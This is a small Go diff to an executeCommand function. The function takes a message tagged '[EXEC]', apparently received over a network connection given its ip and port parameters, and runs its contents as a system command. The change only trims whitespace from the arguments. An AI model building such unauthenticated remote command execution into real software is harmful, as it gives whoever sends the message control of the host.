@@ -294,6 +294,10 @@ func executeCommand(cmd, ip string, port uint16){
 	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
 	args := strings.Split(tempstr[1], " ");
 	
+	for i, str := range args {
+		args[i] = strings.TrimSpace(str)
+	}	
+	
 	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
 	fmt.Printf("OUT:\n%s", out);
 
